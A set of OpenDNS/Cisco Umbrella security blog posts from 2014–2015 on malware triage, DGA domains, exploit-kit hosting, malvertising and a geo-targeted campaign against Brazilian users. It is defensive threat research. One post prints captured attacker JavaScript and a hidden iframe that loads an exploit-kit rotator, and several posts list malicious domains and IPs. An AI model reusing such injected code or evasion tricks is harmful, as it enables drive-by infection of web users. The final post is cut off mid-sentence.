{"website": "Cisco-Umbrella", "title": "Investigating A Malicious Attachment Without Reversing", "author": ["Andrew Hay"], "link": "https://umbrella.cisco.com/blog/investigating-a-malicious-attachment-without-reversing", "abstract": "Do you need to be a hardcore malware reverser to understand how malware works under the covers? No, not always. Here’s an example of using some free tools and OpenDNS Investigate to expedite the analysis process and rapidly protect your organization. Subject: Urgent Notification N443111645\nThank you for placing order with our company now! Your purchase is processing right now.\nOutright Purchase: 4200 AUD\nPlease check the statement given with this email to see more details about your order.\nORDER DETAILS\nPurchase Number: AGS873904473\nOrder Date: 12:45 Monday, Mar 2 2015\nCustomer Email: <victim email address> Attached to the email is a Microsoft Compiled HTML Help file (.chm) that, according to VirusTotal at the time of this writing, has been uploaded 28 times since 2015-03-02 23:11:38. The file most commonly utilizes the pattern payment_ ddddd .chm, where ‘ ddddd ‘ is a seemingly random generated integer five digits in length. Full dynamic analysis of this file can be viewed here: https://www.virustotal.com/en/file/0d18bc9bd50080598f9d69032de95b2ed438e77884a6389755f523f3901c0b39/analysis/ . When executed, the .chm file downloads an executable named tv.exe from www[.]igloofire[.]com. The tv.exe file generates domain names using a DGA, tries to resolve the domain names, and finally contacts those domains with a single HTTP GET request and 20 HTTP POST attempts. The VirusTotal dynamic analysis for the tv.exe file can be viewed here: https://www.virustotal.com/en/file/8e801b9171291c11b0a3fcbd4314a078ff2c43305808fd49434858654e4e4bde/analysis/ “But Andrew,” you ask, “how do you know that? We don’t see anything in the VirusTotal analysis to substantiate that.” That’s absolutely correct. In fact, the dynamic analysis from VirusTotal only shows communication to 134.170.185.211 on UDP port 123 – which is a Microsoft NTP server that the Windows virtual machine likely called out to in order to sync its time. This exact situation illustrates some of the issues with relying entirely on dynamic analysis engines. That being said, we strongly suggest that you try multiple engines/platforms when performing dynamic analysis to see what shakes out. One alternative is The Shadowserver Foundation’s Malwr.com platform. Analyzing the downloaded tv.exe file on Malwr.com shows us that several signatures have been trigged. As well as interaction with the DGA in question – perviylich[.]ru Additionally, we can observe the system level communication flow and the Windows hooks involved in said communication. Now reversing the malware would have eventually given us this domain but we’re in triage mode right now. We can always reverse the malware later to confirm and/or expand our findings. Looking up the perviylich[.]ru domain in OpenDNS Investigate, we can tell several things: 1) The domain is blocked by OpenDNS 2) The domain only recently became active 3) The majority of clients requesting the domain are from Australia (80%) – perhaps a targeted attack on a particular region? 4) The threat model identifies this domain as having a high likelihood of being a DGA 5) The domain utilizes the following IP addresses: 193.169.86.178 (also the name server) and 62.76.187.73 6) The IPs are allocated to AS’ in Ukraine and Russia, respectively 7) The IP addresses also host a number of other DGA-looking domains 8) In looking at some of the other domains on that infrastructure, we can see a similar pattern across the entire hosting IP addresses 9) We can also see a pattern emerge that shows pairings of DGA registrations utilizing the same domain name combined with both a .ru (Russia) TLD and a .su(Soviet Union) TLD. 10) Using this information, we can create a master list of domains involved in this particular malware infrastructure run: cvelasiren[.]ru cvelasiren[.]su dobriytsar[.]ru dobriytsar[.]su dobroeutro[.]su eplayavodka[.]ru gromkiyzvuk[.]ru gromkiyzvuk[.]su holodnoepivo[.]su horoshiyden[.]ru horoshiyden[.]su korichneviyrassvet[.]ru korichneviyrassvet[.]su krepkiystul[.]ru krepkiystul[.]su krugovayaporuka[.]ru krugovayaporuka[.]su lasiren[.]su letniydozhd[.]ru letniydozhd[.]su nogaknoge[.]ru nogaknoge[.]su perviyclass[.]su perviylich[.]ru perviylich[.]su perviysneg[.]ru perviysneg[.]su podliyvrag[.]ru podliyvrag[.]su rozoviyzakat[.]ru rozoviyzakat[.]su shumelkamish[.]ru shumelkamish[.]su silniygrom[.]ru silniygrom[.]su techetreka[.]ru techetreka[.]su temnayanoch[.]ru temnayanoch[.]su temniyles[.]ru temniyles[.]su teplayavodka[.]ru teplayavodka[.]su tihiyshepot[.]ru tihiyshepot[.]su tomniyvecher[.]ru tomniyvecher[.]su truhlyaviypen[.]ru truhlyaviypen[.]su trusliviyzayac[.]ru trusliviyzayac[.]su utliycheln[.]ru utliycheln[.]su If you’re a visual person, you can also graph the domains, using the OpenDNS Investigate API and the open source OpenGraphiti tool, to show the linkages. The image below shows the domains (outside edge of circle) and how they’re associated with the two IP addresses found earlier in this post. To confirm findings, however, you can (and probably should) analyze the memory of the running binary to ensure that there are no subsequent IP addresses or domains called out to that may have been missed by your dynamic analysis engines. In this particular case, there were no additional domains or IP addresses. 11) Digging even further into the domain list, we can query Investigate for any IP addresses these domains resolved to in the past Placing the domains into Maltego and using OpenDNS’s Investigate transform , we found two IP addresses these domains resolved to. Both 193.169.86.178 62.76.187.73 Both of these IP addresses were also the IP addresses of the domains’ name servers. This add to the suspiciousness of the domain names. 12) Identifying the name server domains, we queried Whois to find more information about the registrant of the name server domains. It turns out the email account, domains.globality87234@yopmail.com, used to register the name server domains also registered a handful of other domain names. Domain Name Creation Date johny-mrroinson.com 09-jan-2015 financeoutfeet.com 17-jan-2015 jhon-russel.com 20-jan-2015 dnsservice7736.com 22-jan-2015 nick-stoll.com 30-jan-2015 dnsbbbbdns.com 31-jan-2015 jopanikstor.com 07-feb-2015 nsserver-noserver.com 10-feb-2015 dnskkop12.com 15-feb-2015 dnsdomainserv12.com 16-feb-2015 dns-pupkin-vasya.com 03-mar-2015 All of which had similar subdomains of ns1, ns2, ns3, and ns4 and all of which were registered through the notoriously abused BizCN.com registrar and were acting as name servers for fastflux as well as command and control domains. We dumped all these domains, their subdomain, and their IP addresses into our Maltego graph and found some interesting connections. 13) Noting that YopMail is a free temporary email service, we visited the site and checked the web-based inbox of domains.globality87234@yopmail.com (the registrant of all these name servers associated with malicious domains) It turns out the registrar confirmation emails were still there, dating March 1 through March 3. This confirms the whois records. 14) It should be noted that AS48031 is a rogue AS that has been serving malicious sites for a while in addition to performing various evasive actions. We’ve been monitoring it for a while and discussed it in March 2014 in this webcast (minute 19:25 in “Rogue and Stealth ASNs”) and at Virus Bulletin here . AS48031, XSERVER-IP-NETWORK-AS PE Ivanov Vitaliy Sergeevich,UA, that a lot of security folks will recognize has been hosting all kinds of malicious and shady content (malware, browser-based ransomware, porn sites, spam, radical forums) and it’s been “fluxing” on and off the routable IP space. For example, in earlier 2014, it disappeared off the global routing table but as of early March 2015, AS48031 is online and advertising its prefixes by verifying our BGP routing tables and as shown below. At the time of this writing, there are 1900+ live IPs on AS48031 IP space, and further checking them reveals finer granularity of allocation. A few suspicious small hosters are selling this sub-allocated IP space for customers via VPS, VDS, and dedicated servers. justhost.in.ua is one of these hosters that warrants further scrutiny. We discussed similar rogue or abused small hosting providers in our recent talks at BlackHat, DefCon and Virus Bulletin . We wouldn’t be surprised to see a few domains start using dns-pupkin-vasya.com as an authoritative zone very soon and can with confidence, say they are domains you don’t want your devices connecting to. At this point you should have a good idea of how to leverage OpenDNS Investigate to perform detailed malware triage and infrastructure investigations to protect your organization and its users – all without having to open a hex editor or manual debugger. Until next time!", "date": "2015-03-04"},
{"website": "Cisco-Umbrella", "title": "Interactively Investigate Internet Infrastructure", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/interactively-investigate-internet-infrastructure", "abstract": "Today we officially announce a set of Maltego transforms for interacting with the OpenDNS Investigate API . Wait. You guys have an API? If you haven’t heard, OpenDNS has an API for our Investigate product. Investigate automates protection against both known and emergent threats and exposes the intelligence we derive from our global DNS visibility. This global visibility can be used for a bunch of different things. The research team here at OpenDNS uses it internally to further explore and categorize online threats. Other internal security teams could use it to do the same or they could use this information for monitoring and mapping external corporate network assets. What is Maltego? Maltego is a cross platform interactive application, by Paterva, for exploring relationships and conducting link analysis. Relationship and entity graphs are generated in Maltego through transforms, which automatically extend the graph a user is working on. Relationship graphs are a flexible means of expressing interactions and producing intelligence. Maltego is used extensively for reconnaissance in penetration testing engagements. It can graphically express links between infrastructure, systems, services, accounts, and people, and ultimately assist in attack targeting. What can people do with this new awesomeness? Exploring how domain names map to IP addresses, which IP addresses are authoritative for a domain, and which domains reverse map to those IP addresses is a great way to gain insight into malicious actor’s infrastructure. Couple these relationships with domain registration information and sample analysis and you’re on your way to tracking Internet threats. Available transforms provide the ability to locate: IP addresses a domain previously resolved to Domain names an IP address previous mapped to Domain names that cooccur with a domain name Domain names that are related to a domain name The authoritative name servers for a domain IP addresses of a domain’s name servers Each domain entity returned by these transforms includes the content and security labels OpenDNS has categorized the domain name as. I’m sold. How can I get it? The Maltego local transforms that takes advantage of the OpenDNS Investigate API can be found here . Doesn’t OpenDNS have its own visualization engine? We do. It’s called OpenGraphiti and it also takes advantage of our Investigate API and has the ability to visualize over 10,000 nodes. Do you have any pictures? Yes we do!", "date": "2014-11-06"},
{"website": "Cisco-Umbrella", "title": "From Dedicated to Compromised Domains: The Shift in Adversaries' MO to Deliver Exploit Kit Attacks", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/dedicated-compromised-domains-shift-adversaries-mo-deliver-exploit-kit-attacks", "abstract": "Earlier this year, we covered results of a 5-month study (November 2013 to February 2014) on tracking Nuclear Exploit kit domains from a hosting IP infrastructure perspective [1] . We discussed the evasive methods of the bad actors, their abuse of hosting providers, and we elaborated on methods to predictively identify and block IP infrastructures set up by adversaries to deliver Exploit kit attacks. Since then, several elements have changed in the MO of bad actors. In this blog, we discuss some results of a subsequent new 5-month study we conducted between February and June 2014. Earlier brief results were discussed at BSides Raleigh 2013 [2] (slides 27,28), and then we shared some preliminary results of the new study at the ISOI13 conference in March [3] . This work is still ongoing and we will cover more details at BlackHat [4] and VirusBulletin [5] . For this study, we designed a system to preemptively and effectively detect malicious subdomains injected under compromised domains (particularly GoDaddy domains) and track their IP infrastructure. The phenomena of compromised GoDaddy domains serving malware has been around for at least 2 years [6] . The compromise can happen through at least two methods: hacking GoDaddy accounts or injecting malicious redirection scripts into vulnerable GoDaddy websites. When the compromise is successful, subdomains (third level domains) are injected under the GoDaddy domains (second level domains), and these subdomains would resolve to malicious sites. Most Abused ASNs We have been monitoring this threat for the past 5 months (February to June 2014) and observed that the subdomains resolve to IPs serving Exploit kit attacks (typically Nuclear [7] [8] and Angler [9] [10] ) and also browser-based ransomware. We recorded several hundred IPs hosting these malicious subdomains over the period of the study. The top 5 abused ASNs are: 16276 OVH SAS 24961 myLoc managed IT AG 15003 Nobis Technology Group, LLC 41853 LLC NTCOM 20473 Choopa, LLC AS16276, which is OVH, hosted 18% of the total malicious IPs. In this specific case, as the abuse of OVH has been exposed since last year and up until February 2014 (particularly for hosting Nuclear Exploit domains [11] ), bad actors have changed their MO: they switched temporarily to other hosting providers, and started using recycled IPs (not reserved exclusively for Exploit domains). Additionally, OVH took action by suspending rogue accounts. However, by monitoring the compromised domains’ campaigns, we observed that OVH was still being abused by bad actors to host malicious content. These were the general changes in bad actors’ MO that we observed: From a domain perspective, for a while, bad actors had been abusing various ccTLDs (e.g. .pw, .in.net, .ru, etc.) facilitated by rogue or victim registrars and resellers. Then, they supplemented that approach with using compromised domains, particularly GoDaddy domains under which they inject subdomains to host Exploit kit landing urls and browlock (Notice that using compromised domains for attacks goes further back in the past for other different campaigns). From an IP perspective, bad actors used to bring the attack hosting IPs online in contiguous chunks, then they started bringing them up in randomized sets or one IP at a time. The other notable fact is that bad actors used to abuse OVH Canada (attached to ARIN) where rogue customers were reserving re-assigned small ranges (/27, /28, /29, etc.). By consulting the ARIN Rwhois database, it was possible to correlate the rogue customers with the IP ranges they reserve and therefore predict and block the IP infrastructures they set up for Exploit kit attacks. As the adversaries changed MO, this method became less effective in tracking them. The shift became clear when they started to more frequently use ranges on OVH’s European IP space (which is attached to RIPE) as well as other European providers. Typically, we saw small gaming hosting providers being abused among other platforms. Additionally, although the standard geolocation of OVH European IP space maps to France (FR), the attack IP ranges were reserved from OVH’s server pools in various European countries (France, Belgium, Italy, UK, Ireland, Spain, Portugal, Germany, Netherlands, Finland, Czech Republic, and Russia). This clearly shows that the adversaries are diversifying their hosting assets which provides them redundancy and evasive capabilities. Notice also that RIPE has stricter data protection laws so it would be more difficult to obtain information about customers, and that could explain the shift in hosting infrastructures by the bad actors. More generally, we list a few of the small scale hosting providers involved in hosting the attack subdomains. These hosting providers could either be abused, complicit with the bad actors or simply lax about the maliciousness of the content they host. Notice the rogue providers among these will often switch prefixes by dropping dirty ones and reserving new ones from the backbone providers they are attached to. http://king-servers.com/en / This hoster has been observed to host Exploit kit domains (Angler, Styx), porn, dating sites, pharma sites [12] . It was also described by a comment on Web Of Trust as “Offers bulletproof hosting for Russian-Ukrainian criminals (malware distributors etc)” [13] . http://evrohoster.ru/en/ hosted browlock through redirections from porn sites [14] . http://www.xlhost.com/ hosted Angler EK domains https://www.ubiquityhosting.com/ hosted browlock. http://www.qhoster.bg/ hosted Nuclear EK domains. http://www.codero.com/ http://www.electrickitten.com/web-hosting/ String Analysis of Domain Names During this study, we recorded 19,000+ malicious subdomains injected under 4200+ compromised GoDaddy 2LDs. By analyzing the strings used for the subdomains, we recorded 12,000+ different labels. We show the list of top 5 labels used: police, alertpolice, css, windowsmoviemaker, solidfileslzsr. police and alertpolice were the most used labels for hostnames serving browlock and the remaining labels were used for hostnames serving mainly Exploit kit attacks. In the chart below, we show the frequency of number of occurrences for all used labels. One single label occurred 746 times (police), 1 label occured 22 times (alertpolice), 1 label occurred 10 times (css), 15 labels occurred 6 times (windowsmoviemaker, solidfileslzsr are among them), and 11,727 distinct labels occurred a single time. Stay tuned for more results at BlackHat [15] and VirusBulletin [16] .", "date": "2014-06-19"},
{"website": "Cisco-Umbrella", "title": "Hackathon: Programming for non-programmers", "author": ["Dan Hubbard"], "link": "https://umbrella.cisco.com/blog/hackathon-programming-non-programmers", "abstract": "Last week we had another amazing hackathon here @OpenDNS. Twice per year we bring in all engineers from our Vancouver office to San Francisco for a 24 hour hackfest. Rules are limited and creativity is encouraged. This time was not unlike others where we had some amazing projects done end-to-end. This was also our biggest one to date with more than 60 folks participating on 20+ teams. Although the hackathon’s have been a tremendous success, to date, they have been limited to technical people within the company. Because of that I joined forces with our head of customer support, Brian Hartvigsen, to create some training material and host a mini hackathon where we would host a session on teaching programming to non-programmers. The concept was simple, we would ask people from other departments like; sales, HR,  and marketing, to participate after their regular work hours from 5:00 – 7:00 PM and train them on how to program. From there they would have two hours to pair up and write some code and come back and present what they did. The judging would be done by anyone who showed up to the demonstrations and we had categories for: Best overall, most creative, and most challenging. Instead of using a language like Python, Perl, and Ruby, we decided to use Scratch . Scratch is a great programming environment for beginners as its 100% visual and provides a very easy way to create a program while learning some valuable programming techniques that can be used with other languages. The result was amazing. We had five separate teams who created some fun projects and did great jobs by pairing, building, and demonstrating their work. We also ended up having almost half all the engineers take a break from their hackathon to come watch and judge the demos. Equally as great was that some of the teams solicited help from engineers on their projects and we saw co-operation cross departments in an area you typically would not. The non-programmers certainly left with an appreciation of how to build software and the process. Below are some screenshots of the projects that were created by team members. Based on the success of this we plan on doing more programming for non-programmers in the future and including non-engineering teams in future hackathons.", "date": "2014-06-19"},
{"website": "Cisco-Umbrella", "title": "Why Ads and Security Don’t Mix", "author": ["Barry Fisher"], "link": "https://umbrella.cisco.com/blog/ads-security-dont-mix", "abstract": "Our CEO and founder, David Ulevitch, recently announced that OpenDNS would be turning off ads. The main reason is because, as David says, “ads and security don’t mix”. In the last few years, “Malvertising” (malicious advertising) has reached epidemic proportions. That’s bad for many reasons, but one cool thing is that OpenDNS has a product that is awesome at preventing malicious ads from impacting our customers—from Fortune 100 companies to individual home users. Ads: A Complex and Vulnerable Ecosystem Not many Web surfers realize that when you a visit a website such as TMZ.com—a popular tabloid news site—it triggers user interactions with 352 third-party Web servers without your consent. Websites are commonly linked to dozens to hundreds of other servers—most are a result of online ads. In 1997, ad networks were established to be a conduit between advertisers and content publishers. Over the years, advertisers outsourced parts of their ecosystem to third parties, who in turn contracted out further. And as result, online ad delivery evolved into a highly complex process involving an unsecure chain of often six intermediaries that come and go all the time. Like most technology innovations that pursue speed over security, cyber criminals found flaws that were easy to exploit for profit with little risk of being caught. Malvertising: From Embarrassment to Epidemic Even though Malvertising became a widely known and recurring threat by 2009 (e.g. Guardian article ), incidents are frequently forgotten after a few days. Typically, in Malvertising incidents, the website owner suffered some embarrassment, apologized, and pointed a finger at the ad network that served the ad. Then, the network owner apologized and disabled the offending ad. And everyone moved on. Today, it has evolved from mere embarrassments into an epidemic that has caught the attention of the U.S. Senate Homeland Security and Governmental Affairs Committee. After a year of investigations, a subcommittee published a report in May with this #1 finding: “Consumers can incur malware attacks without having taken any action other than visiting a mainstream website. The complexity of the online advertising ecosystem makes it impossible for an ordinary consumer to avoid advertising malware attacks, identify the source of the malware exposure, and determine whether the ad network or host website could have prevented the attack.” In 2014, two separate Malvertising incidents impacted millions of Yahoo and YouTube users. In both, simply searching for something or watching a video was enough to lead to an infection. The Online Trust Alliance testified that based on its research, Malvertising increased 200%+ in 2013 to over 209,000 incidents, generating 12.4B+ malicious ad impressions. Cisco’s 2013 Annual Security Report found that online ads were the second most common source of Web malware encounters–16% of all encounters Cisco observed and 182 times more likely than viewing adult content. Source: Online Trust Alliance Over the years, a majority of the largest ad networks have been compromised including DoubleClick (Google), YieldManager (Yahoo!), AppNexus, rad.msn.com (Microsoft), and Fimserve.com (FOX Audience Network). By focusing on ad networks, attackers obtain an effective channel for indirectly compromising thousands of websites through malicious banner ads, and then targeting every visitor or specific visitors. The biggest Web properties have been impacted including Facebook.com, YouTube.com, MLB.com, USNews.com, NYTimes.com, LATimes.com, WashingtonPost.com, HuffingtonPost.com, LondonStockExchange.com, TheOnion.com, SFGate.com, DailyMotion.com, SpeedTest.net, Hoovers.com, Tucows.com, Hotmail, Yahoo! Mail, numerous ad-supported mobile apps, and even ad-supported desktop apps like Spotify. Attackers: As Clever as Advertisers To deliver malicious ads to you, attackers either socially engineer a good reputation for their own fake ad network or advertising service, or hack their way into an existing vulnerable ad network. In the former case, attackers often claim to partner with well-known and legitimate online advertisers—even by using falsified letters of mandate. Attackers gain trust by first offering the targeted publishers creative ads that are clean, before pushing out malicious ones. A common misconception is that you must click on ads to get infected, which is sometimes true, but often not. Online ads appear to be an image hosted on the website, but they’re neither hosted on that website nor just an image. Ad networks, which are not under the control of the host website, decide which ad to send you, but often don’t actually deliver the ads. Instead, the ad networks instruct your browser to call a server designated by the advertiser. Also, ads often deliver files and entire programs to your browser. To infect you, HTML-based Javascript or Flash-based ActionScript covertly routes your browser to a different server that hosts an exploit kit. Flash is scary because it embeds sophisticated logic into the ad, which manipulates your browser as the ad is displayed. Ads can be instructed to only attack you and others at particular times and geographies. Some examples are delaying the attack until after the ad network examines and approves the ad; or until holidays, when it’s peak time for people to surf and off time for advertisers’ personnel to promptly remove offending ads. Law enforcement personnel have commonly found calendars marked with U.S. holidays in cyber-criminal hideouts in foreign countries. And if the attackers know that ad malware scanners are located on servers in Los Angeles and New York, they might instruct ads to only be malicious for visitors in San Francisco. The exploit kits themselves probe your browser environment for possible vulnerabilities to attempt. Despite frequent flaws discovered in Adobe and Java browser plug-ins, the security community is vigilant monitoring this activity. Yet Cisco expects Microsoft’s streaming media plug-in—Silverlight—to become the target of more exploit kits. Best known for enabling Netflix’s streaming video service, Silverlight also supports 60% of rich Internet apps—so it will be a bad day for everyone when Malvertising finds its way onto one of these massive streaming platforms. Security: Reroute Visitors Around Malvertising Online ads often provide the primary or only revenue source for Websites that offer some amazing free content and services. And OpenDNS was a great example of this, yet the risks of Malvertising clearly outweigh the benefit of a few more dollars. Today, we no longer rely on this revenue source to operate either our free or paid services, because we’ve proven to over 10,000 businesses and thousands of home users how amazing our enterprise-grade security service—Umbrella—is at blocking such threats. As nefarious as Malverting is, it does have an achilles heel—your browser must connect to third-party Web servers via a domain name. When your browser asks which IP address is mapped to that domain name, and either the domain or IP is tied to Malvertising, Umbrella routes your browser to our block page server instead—even when you’re not in the office or at home.", "date": "2014-06-12"},
{"website": "Cisco-Umbrella", "title": "When Suspended Domains Are Actually Targeted Attacks", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/suspended-domains-actually-targeted-attacks", "abstract": "Our models and manual investigations often uncover unlabeled domain names that are likely to be part of an infection chain – eventually leading to domains already known to be malicious. During the first week of March, cdn11[.]net and cdn777[.]net were observed, before other domains, serving exploit kits. Curiously, our DNS database didn’t have any information about these specific domains – and using a local DNS resolver offered no additional insight. The dnsws[.]net authoritative servers were apparently not answering any queries about these domain names. Why were queries to these being observed over and over again? Temporarily sinkholing these domains revealed that they were being loaded from a small set of compromised sites which people were redirected to via malvertising methods. Based on our research this was occurring primarily via Yahoo Ads. Clients following this infection chain all had something in common: the user language. The user language, as specified by the Accept-Language header sent by web browsers, was Brazilian Portuguese (pt-BR). Our friend @vmmello further reported that these domain names were actually resolving in Brazil. Trying to access the URL observed in our sinkhole logs returned nothing but empty content. However, the same URL accessed from a client IP located in Brazil was serving something radically different. In addition to some basic analytics code, this page included an iframe that ignited an exploit kit. This campaign targeting Brazil was invisible to the rest of the world. A set of custom authoritative DNS servers was answering only some specific client IPs based on their geographical location. Also, the web server injecting the page with the malicious iframe was not answering clients outside of Brazil. The first set of domains was taken down by the registrar. The bad guys shifted to a new set of domains immediately after, with winter-cdn[.]com being the first one we observed. Browsing hxxp://www.winter-cdn.com, or the exact referrer displayed a page that simply read “This account has been suspended”. At first, it sounded like good news. We had hoped that the hosting provider had already closed the bad actor’s account. Sinkholing this domain revealed that the following chain was being used to reach the site: Yahoo malvertising (targeting Brazil) -> www[.]soloinvite[.]com -> www[.]winter-cdn[.]net As it happens, browsing www[.]soloinvite[.]com also displayed a “This account has been suspended” banner. So far, so good. Unfortunately, in mapping the location of the requesting clients, Brazil was still clearly targeted: We tried to access these URLs using a popular VPN service that had a point of presence in Brazil. Unfortunately, all we got was the “this domain has been suspended” banner. Case closed? Not quite yet. We decided to keep investigating. Accessing the same URLs via the IP address of a residential ISP in Brazil returned noticeably different content: At face value, this would have been a totally benign web site. That is, of course, if it didn’t contain the following code: function sendTest()\n{\n    var parameters = \"\";\n    document.getElementById(\"banner\").innerHTML=\"\";\n    if (window.XMLHttpRequest)\n    {// code for IE7+, Firefox, Chrome, Opera, Safari\n        xmlhttp=new XMLHttpRequest();\n    }\n    else\n    {// code for IE6, IE5\n        xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    xmlhttp.onreadystatechange=function()\n    {\n        if (xmlhttp.readyState==4 && xmlhttp.status==200)\n        {\n            document.getElementById(\"banner\").innerHTML=xmlhttp.responseText;\n        }\n    }\n    var a=Math.floor(Math.random()*11);\n    var b=Math.floor(Math.random()*11);\n    parameters = \"a=\"+ b + \"&b=\" + b + \"&c=\" + (a+b);\n    xmlhttp.open(\"POST\",\"/ads/banner.php\",true);\n    xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");\n    xmlhttp.send(parameters);\n}\nsetInterval(sendTest(),1000); When loaded from a browser (instead of a web crawler) a fake banner is loaded. This looks like the following: <iframe id=\"frmAdResell\"\nsrc=\"hxxp://www.winter-cdn.com/…\" height=0 width=0\nframeborder=0></iframe> The content of this iframe was similar to what was previously observed. It contained some basic analytics as well as a rotator for the exploit kit code: <iframe id=\"frmAdResell_24779\" name=\"frmAdResell_24779\" src=\"hxxp://iu6zb8663m7p45ce4i-be1.maxcredite.ru\" frameborder=\"0\" height=0 width=0 ></iframe>\n<script type=\"text/javascript\">\nvar sc_project=9455979;\nvar sc_invisible=1;\nvar sc_security=\"35c41416\";\nvar scJsHost = ((\"https:\" == document.location.protocol) ?\n\"https://secure.\" : \"http://www.\");\ndocument.write(\"<sc\"+\"ript type='text/javascript' src='\" +\nscJsHost+\n\"statcounter.com/counter/counter.js'></\"+\"script>\");\n</script> Malware authors constantly up their game to evade automated detection. This infection chain, however, also features deception techniques in order to confuse security researchers during manual investigations: Custom authoritative DNS servers, only returning answers to a specific set of clients. Because we do not currently have a point of presence in Brazil, this fooled some of our generic detection models. Domain names referring to a Content Delivery Network, which researchers are usually reluctant to block. Fake mention of an account having been suspended, which suggests to researchers that the case has been closed and that no further investigation is needed. Connecting from one of the targeted networks is the only way to see the actual content. VPNs with a presence in the targeted country do not necessarily reveal the real content either. Unfortunately, these techniques appear to be quite successful, with only 1 other security vendor out of 51 having flagged some of these domains as malicious. This particular issue illustrates the need to explore and combine different techniques to successfully track malware. Also, continuous tweaking and improvement of methodologies, classifiers, and inspection capabilities is required to keep pace with the attackers.", "date": "2014-04-02"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Recognized as #1 Innovative Enterprise Security Startup", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-recognized-1-innovative-enterprise-security-startup", "abstract": "The marketing people wanted a serious title, but my alternate title for this post would be “Why being ‘other’ in security is actually a great thing.” Today, Justin Somaini (current Chief Trust Officer of Box, Inc. and former Yahoo and Symantec CISO), released the results of a security practitioners survey covering the top 20 Innovative Security Companies. We were thrilled to find out that we ranked highest in the list. Being recognized as the best by the people evaluating the best enterprise security offerings is a great feeling. In Somaini’s words: OpenDNS came out way ahead of all other vendors. While they have been around for some time, since 2005, their core value of threat and policy management via DNS is a strong value with 43% of people saying they provide “High Value”.  It’s also interesting to note that the root of the company was in consumer security and only recently, in the past couple of years, made the move into the Enterprise.  With this the value is resonating significantly amongst CISO’s.  We should see much more of them in the future as they make their push farther. Competitively, it looks like they have a solid ownership as I struggle to see anyone competing with them in their space. But here’s something else that is interesting: Somaini’s survey had us listed as “Other” when it came to describe what market we fit into. Not “Secure Web Gateway,” not “SIEM,” not “Application Security.” Just “Other.” This seems like a trend for us. In Gartner’s “Market Trends: Cloud-Based Security Services Market, Worldwide, 2014” we were also mentioned as a Vendor to Watch in the “Other Security” category. The “other” category in the security space represents the security disrupters that do not fit the “traditional” security categories. However, if we think back, that category has previously included great security companies like Palo Alto Networks & FireEye.  We’re in good company. The “other” category represents companies that look at customer problems and design a new approach to solve it. FireEye accomplished this with their advanced behavior analysis appliance. Palo Alto Networks did it with their approach to application identification, bringing newfound utility to the aging Firewall market. In our case, we’re helping to solve the challenges created by the eroding network perimeter and the rise of the sophisticated attacker. We attack both problems by looking at the last 35 years of enterprise security best practices and applying them to the world we work in today.  It’s great to be recognized for our outside-the-perimeter way of thinking, and we’re excited to bring it to more customers. Thanks to the security practitioners and to Justin for the visibility and recognition.", "date": "2014-02-10"},
{"website": "Cisco-Umbrella", "title": "Finding the Patterns in a Mysterious New DGA", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/mysterious-dga-lets-investigate-sgraph", "abstract": "For the past two weeks, since Oct 9th, we’ve observed a high volume of periodic nxdomain lookups in our DNS traffic to a number of Domain Generation Algorithm (DGA) domains. In investigating these domains we found a few curious patterns in when and how they seemed to appear. A DGA  is a technique that uses a random or dynamic component in its logic to generate domain names. This component can be a random number or the current time, and combined with alphanumeric characters, the algorithm will generate a new different domain name in every iteration. DGA domain names are typically generated by certain malware families to contact their CnCs as a scheme against domain or IP blocking of the malware CnCs, or to prevent the domains from being as easily identified  as if they were hardcoded in the malware. However, not all DGA-like domains are necessarily malware related. For example, Chrome connects at startup to random domains to determine if you’re currently on a network that intercepts and redirects requests for nonexistent hostnames [1] . Or a seemingly random domain could be used as a form of DNS-tunneling where a request is encoded in the domain name, and depending on the DNS query type, a specific response is sent back to the client [2] . In this case, the 12 DGA domains we’re investigating do seem to be part of some suspicious activity. These are the first domains that we noticed: eqxowsn.info ggegtugh.info hquterpacw.net oumaac.com qfiadxb.net rwyoehbkhdhb.info rzziyf.info vmlbhdvtjrn.org yeiesmomgeso.org yeuqik.com yfewtvnpdk.info zffezlkgfnox.net Take a look at the daily periodic traffic to zffezlkgfnox.net across all data centers: Daily DGA domains While the traffic to these 12 domains was ongoing, on Oct 16th we observed the emergence of about 570+ related DGA domains that received lookups during the entire 24 hours of the day before dropping to no activity. On each of the following days, from Oct 17th to Oct 21st, we saw about 2100+ DGA domains display the same traffic pattern of constant lookups lasting exactly 24 hours then complete drop. Each day, there was a completely new set of DGA domains, and all of these lookups were nxdomains, except for a handful of resolving domains that we will discuss later. In total, we saw 12000+ unique DGA domains in our DNS traffic over a period of 2 weeks. Then, suddenly around 12am on Oct 22nd, traffic to all of these domains stopped. For the present moment, no new related DGA domains have been observed. Below we show the traffic pattern of one of these daily domains along with the daily DGA domains counts. DGAs are all related All of these domains are linked together via the related domains model, meaning they are looked up by the same set of client IPs during a short time period. Assuming these DGAs are malicious, this is an indication that they are likely generated by a single or similar malware samples. To discover the set of 12000+ domains, we start from a seed DGA domain as the root then traverse the graph of related domains over a very high number of hops away from the root. Since it is very likely that non-DGA legitimate popular sites (for example we observed dropbox.com, hulu.com, cnn.com, etc) could be looked up during the same time frame as the DGA domains, they might end up in the related domains set of traversed nodes. After careful empirical verification to make sure we are catching DGA domains that fit in our target set, we only keep domains that meet a certain traffic profile. This profile corresponds to a specific volume of traffic that spans only 24 hours. This filtering heuristic turns out to be efficient as no false positives were observed. Below we can see a sample of related domains as displayed by the Security Graph web interface and also the visualization engine. The related domains is close to the co-occurences model that we used before [3] [4] In the meantime, on Oct 19th, João Gouveia from AnubisNetworks’ research lab (@jgouv) tweeted about a new DGA lookalike set of domains that he saw rising in traffic and that was quite active in Brazil. He also posted a screenshot of a sample DGA domains which happened to correspond to the same domains seen in our traffic. Worldwide DGA DNS traffic On the map below, we show the worldwide volume of DNS traffic to a sample of DGA domains recorded on Oct 18th. From this daily sample, we see that the top 10 countries generating traffic to these DGA domains are Turkey, Bulgaria, Brazil, Russia, Italy, India, Vietnam, Lithuania, United States, and Poland. It is interesting to see the heavy traffic volume coming from Turkey compared to other countries. Domain name analysis Based on the sample set, all of these DGA domains consist of 1 single label and fall under 4 TLDs: info, net, org and com. Below we can see the domains’ TLD distribution. Every domain label is a 